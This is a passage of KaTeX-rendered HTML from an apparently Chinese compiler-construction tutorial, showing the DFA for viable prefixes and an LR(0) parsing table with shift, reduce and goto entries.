class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.076239999999999em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>推出识别<strong>活前缀</strong>的DFA：</p>\n<img src=\"/img/com.png\" class=\"\">\n<p>得到DFA后由此得到LR(0)分析表：</p>\n<table>\n<thead>\n<tr>\n<th>状态</th>\n<th>a</th>\n<th>b</th>\n<th>c</th>\n<th>d</th>\n<th>$</th>\n<th>E</th>\n<th>A</th>\n<th>B</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>3</mn></mrow><annotation encoding=\"application/x-tex\">3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">3</span></span></span></span></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>4</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_4</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>6</mn></mrow><annotation encoding=\"application/x-tex\">6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">6</span></span></span></span></td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>7</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_7</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">7</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>8</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_8</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>9</mn></mrow><annotation encoding=\"application/x-tex\">9</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">9</span></span></span></span></td>\n</tr>\n<tr>\n<td>3</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi><mi>c</mi><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">acc</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">c</span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>4</td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>4</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_4</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>10</mn></mrow><annotation encoding=\"application/x-tex\">10</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">0</span></span></span></span></td>\n<td></td>\n</tr>\n<tr>\n<td>5</td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>4</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_4</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>4</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_4</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>4</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_4</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>4</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_4</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>4</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_4</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>6</td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>7</td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>7</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_7</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">7</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>8</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_8</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>11</mn></mrow><annotation encoding=\"application/x-tex\">11</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">1</span></span></span></span></td>\n</tr>\n<tr>\n<td>8</td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>6</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">6</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>6</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">6</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>6</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">6</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>6</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">6</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>6</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">6</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>9</td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span 